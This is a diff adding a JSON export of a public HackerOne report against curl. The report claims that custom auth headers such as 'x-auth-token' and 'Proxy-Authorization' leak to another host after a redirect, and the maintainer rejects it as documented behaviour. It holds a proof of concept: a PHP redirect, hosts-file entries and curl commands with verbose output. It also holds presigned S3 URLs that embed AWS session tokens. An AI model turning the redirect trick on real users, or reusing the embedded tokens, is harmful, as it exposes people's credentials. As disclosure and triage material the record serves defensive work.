@@ -1,0 +1,541 @@
+{
+    "id": 1568175,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTY4MTc1",
+    "url": "https://hackerone.com/reports/1568175",
+    "title": "Credential leak on redirect",
+    "state": "Closed",
+    "substate": "not-applicable",
+    "severity_rating": "medium",
+    "readable_substate": "N/A",
+    "created_at": "2022-05-13T11:31:21.465Z",
+    "submitted_at": "2022-05-13T11:31:21.548Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "iylz",
+        "url": "/iylz",
+        "profile_picture_urls": {
+            "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 35663,
+        "url": "https://hackerone.com/curl",
+        "handle": "curl",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "curl",
+            "twitter_handle": "",
+            "website": "https://curl.se",
+            "about": "cURL is an Open Source project providing a library and command-line tool for doing internet transfers"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [
+        "CVE-2022-27776"
+    ],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2022-05-14T16:06:25.527Z",
+    "bug_reporter_agreed_on_going_public_at": "2022-05-14T16:06:25.474Z",
+    "team_member_agreed_on_going_public_at": "2022-05-14T16:01:34.568Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary:\n[add summary of the vulnerability]\n\nCurl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect , like the Proxy-Authorization 、x-auth-token header. It is a bypass of fix https://hackerone.com/reports/1547048 , CVE-2022-27776 .\n\n## Steps To Reproduce:\n[add details for how we can reproduce the issue]\n\n  1. Create a 302.php file, such as:\n```\n<?php\nheader(\"Location: http://a.com:8000\");\n?>\n```\nAdd the 2 record in the /etc/hosts file:  \n```\n127.0.0.1 a.com\n127.0.0.1 b.com\n```\n  2. curl -H \"Proxy-Authorization: secrettoken\" http://b.com/302.php -vv -L \nThe redirect will be followed, and the confidential headers sent over insecure HTTP to the specified port:\n```\n# curl -H \"Proxy-Authorization: secrettoken\" http://b.com/302.php -vv -L\n*   Trying 127.0.0.1:80...\n* Connected to b.com (127.0.0.1) port 80 (#0)\n> GET /302.php HTTP/1.1\n> Host: b.com\n> User-Agent: curl/7.83.1\n> Accept: */*\n> Proxy-Authorization: secrettoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 302 Found\n< Date: Fri, 13 May 2022 11:22:06 GMT\n< Server: Apache/2.4.6 (CentOS) PHP/5.4.16\n< X-Powered-By: PHP/5.4.16\n< Location: http://a.com:8000\n< Content-Length: 0\n< Content-Type: text/html; charset=UTF-8\n<\n* Connection #0 to host b.com left intact\n* Clear auth, redirects to port from 80 to 8000\n* Issue another request to this URL: 'http://a.com:8000/'\n*   Trying 127.0.0.1:8000...\n* Connected to a.com (127.0.0.1) port 8000 (#1)\n> GET / HTTP/1.1\n> Host: a.com:8000\n> User-Agent: curl/7.83.1\n> Accept: */*\n> Proxy-Authorization: secrettoken\n>\n```\n  3.  curl -H \"x-auth-token: secrettoken\" http://b.com/302.php -vv -L \n```\n# curl -H \"x-auth-token: secrettoken\" http://b.com/302.php -vv -L\n*   Trying 127.0.0.1:80...\n* Connected to b.com (127.0.0.1) port 80 (#0)\n> GET /302.php HTTP/1.1\n> Host: b.com\n> User-Agent: curl/7.83.1\n> Accept: */*\n> x-auth-token: secrettoken\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 302 Found\n< Date: Fri, 13 May 2022 11:24:15 GMT\n< Server: Apache/2.4.6 (CentOS) PHP/5.4.16\n< X-Powered-By: PHP/5.4.16\n< Location: http://a.com:8000\n< Content-Length: 0\n< Content-Type: text/html; charset=UTF-8\n<\n* Connection #0 to host b.com left intact\n* Clear auth, redirects to port from 80 to 8000\n* Issue another request to this URL: 'http://a.com:8000/'\n*   Trying 127.0.0.1:8000...\n* Connected to a.com (127.0.0.1) port 8000 (#1)\n> GET / HTTP/1.1\n> Host: a.com:8000\n> User-Agent: curl/7.83.1\n> Accept: */*\n> x-auth-token: secrettoken\n```\n\nThe reason for the problem is that curl's filtering of authentication header header is incomplete. The Proxy-Authorization and x-auth-token headers are not considered, only restrict the delivery of Cookies and Authorization.\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\nhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization\n\n## Impact\n\nLeak of Proxy-Authorization and x-auth-token headers.",
+    "weakness": {
+        "id": 87,
+        "name": "Insufficiently Protected Credentials"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": null,
+    "vote_count": 4,
+    "voters": [
+        "h4x0r_dz",
+        "shivammusic",
+        "mzm_zulfuqarov",
+        "ittafunahashi"
+    ],
+    "severity": {
+        "rating": "medium",
+        "author_type": "User"
+    },
+    "structured_scope": {
+        "databaseId": 18844,
+        "asset_type": "SOURCE_CODE",
+        "asset_identifier": "https://github.com/curl/curl",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 16685339,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thank you for your report!\n\nWe will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can!",
+            "automated_response": false,
+            "created_at": "2022-05-13T11:32:47.029Z",
+            "updated_at": "2022-05-13T11:32:47.029Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16685483,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Your command lines don't use any proxy and you are explicitly asking curl to pass long those custom proxy headers. I don't see any documentation that says curl would act differently than it does and I don't think there's any implicit unwritten promise that it would.",
+            "automated_response": false,
+            "created_at": "2022-05-13T11:41:14.375Z",
+            "updated_at": "2022-05-13T11:41:14.375Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16687924,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This vulnerability is quite similar to CVE-2022-27774 、CVE-2022-27776 , and the fix is similar too: if not accord with the same origin policy should strip the Authorization and Cookie headers.\n\nThis is definitely not what the user could expect, considering the documentation says:\nWhen authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.\n\nI found use proxy will not reproduce this problem with Proxy-Authorization, but x-auth-token headers still have this problem.\n",
+            "automated_response": false,
+            "created_at": "2022-05-13T13:18:20.851Z",
+            "updated_at": "2022-05-13T13:18:20.851Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16689593,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Compared with Basic Authentication, x-auth-token is more secure and is used by many large websites, such as hackone. ",
+            "automated_response": false,
+            "created_at": "2022-05-13T13:53:27.165Z",
+            "updated_at": "2022-05-13T13:53:27.165Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1728168,
+                    "filename": "1.png",
+                    "type": "image/jpeg",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/6p1lzg1d7nyq98qyhff0nar2pzsh?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=dfa989b6c3b670706a646b5780e8a47d8453a8cd8ee5077f728410c091caaa14"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16690890,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I strongly disagree. If you decide to pass on secrets in the request with your command line, that's on you as a user. Your choice. It's not curl's responsibility to stop you from doing what you ask it to.\n\n1. You add proxy-headers to a server request so it seems you really wanted this to happen - otherwise you would have used `--proxy-header`. curl could *possibly* clear proxy headers, but A) that is not what you're using and B) proxy-headers would presumably also be *wanted* to be used in subsequent requests to the proxy.\n2. `x-auth-token` is not a standard HTTP header. We cannot just go ahead and randomly start clearing headers people invent. If you send sensitive data with whatever header you invent, then this is what is going to happen. Then you probably want to avoid following redirects.\n\nWe should probably clarify that curl only avoids sending `Authorization:` and `Cookie:` headers to other hosts after redirects.\n",
+            "automated_response": false,
+            "created_at": "2022-05-13T14:21:16.859Z",
+            "updated_at": "2022-05-13T14:21:16.859Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16691309,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Quoting a man page paragraph for [-H](https://curl.se/docs/manpage.html#-H), I think this warning is pretty clear:\n\n> WARNING: headers set with this option will be set in all requests - even after redirects are followed, like when told with -L, --location. This can lead to the header being sent to other hosts than the original host, so sensitive headers should be used with caution combined with following redirects. ",
+            "automated_response": false,
+            "created_at": "2022-05-13T14:24:53.198Z",
+            "updated_at": "2022-05-13T14:29:14.070Z",
+            "actor": {
+                "username": "bagder",
+                "cleared": false,
+                "verified": false,
+                "url": "/bagder",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/y9xzl5ayi7du4kz3l6pa6sff2ha5/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22final-12-1000x1000.jpg%22%3B%20filename%2A%3DUTF-8%27%27final-12-1000x1000.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJOTSA3A%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070208Z&X-Amz-Expires=485&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBoV20obGAJNEUzT9%2BNCZi4BzOqzwzcOPOUTeKZbmpyaAiAajgHs6bs8zOhp4DAnYOdWg%2BraHXWSuNo6jYMwuN7RcSq5BQia%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIM4osjXoSinMB0BYr0Ko0FRZs5xCx%2B9YCc8fb2KK4e%2B76kpvgelGsIR0VZg%2BMyP3DxZM4hbf29ENluxoylQ6P1RQjbJrzChD7gM8oZjDj7Hpx95OKuaCFKHkEGh9cSJGLUokibcQcnkZ5Rcg5J33wdFJd3%2FJZ%2BuzM5KKEmO8VUir9Qv748WuiO8LwJ%2BWzAXHVKxSr2Y%2F1KYALoJlQm5Ucvidyz2lok08uMKdQhoLMacFy0gwcF4wdR2OFjpEd0%2FGjWQQOlGIYUL4pUM09PZZ9ScEdX2E4%2Bjmg8V6BRXjYN9wzSLbGuxDHJCqaJj1d2TAj4YL1q2ljYDmIUCc6qFiGXtdRQnCcNu4pQrgZzu9CBfC9DFLhxfwFtEEzza3YS0Q6am9nk1B2tJlJxCBwTyuT%2B6M9YINul9VNyb6QUR%2BMjdmR7YE%2BM8Ls%2FaBYl74%2BUb52WsJSca%2FxRPeDX0j9OZcUnZnfURiGNQ%2B4Je%2FMTBtmXQ%2BNkhd3T7f8VgKHPq7YmAjKbPCXcFp0oST2ja52OwfcWUuEtby%2BJPYZ1DMtdplSF4XP8DktBMWExP9y2IRQVWtkILrHz0AVNUCJE6NVYRYcLQ5kWMN8MiRKWAaECf7fWPykocWKY4IvToQy0Vvqi%2F8f4gVQCWbgNXbhqIlrjXz78vvmexkrRqflEY3Bm7Cpp2JDhKpJpCxlUmc%2FBwmaCgDtdRIuogyPUgkbjWLzoev%2BsAEBAqzkpSRe50iz2Jqqm6zELzv%2F7MAXVqTwSvYs%2FV%2FSt75zx%2Fn3Fa0qBXNr6NdR7ksTH1uhpcCK2S0Cq9cb%2BJ4rKmJJ35HZoRLGNbCOOreyCIKepyJhgjQWee%2Bbrg3DMxc4fN33ulIfdILqxsZBgNtZ6U1oUJUMbcLMtbqIw44W1pwY6sgHkTfEYhn15tDODnENz23ZwyKh2Qupe%2FxI8152twqcrvtBIWaQBYPRIgX7IRMCclQ3aqDDb3ynn6pfMdBG%2FOxVha1FG6JEX3lKGRLGA%2FNP1WczWaca%2BaPJ23cLcbZAyAzKzckvI1%2BmE1pH6%2BbFLVSiK0Go1FBqAvipHyJdIMaOhpQZrnD4u0xJ%2BT4IHx0enLGl0koBQrdojfD5OnlBt8MRf%2B6qJ462EK5YTOaPU4u59H1QO&X-Amz-SignedHeaders=host&X-Amz-Signature=1216f02a5e3fda3e9fc7dfc78668538e3054ec4174e2cccbfd78d834123d9073"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "curl"
+        },
+        {
+            "id": 16691432,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I agree with you on the proxy authorization header,  it not a problem about curl. But x-auth-token header is widely used on the Internet, leak x-auth-token header is a security issue. I hope curl can fix it. Thanks ",
+            "automated_response": false,
+            "created_at": "2022-05-13T14:29:11.126Z",
+            "updated_at": "2022-05-13T14:29:11.126Z",
+            "actor": {
+                "username": "iylz",
+                "cleared": false,
+                "verified": false,
+                "url": "/iylz",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
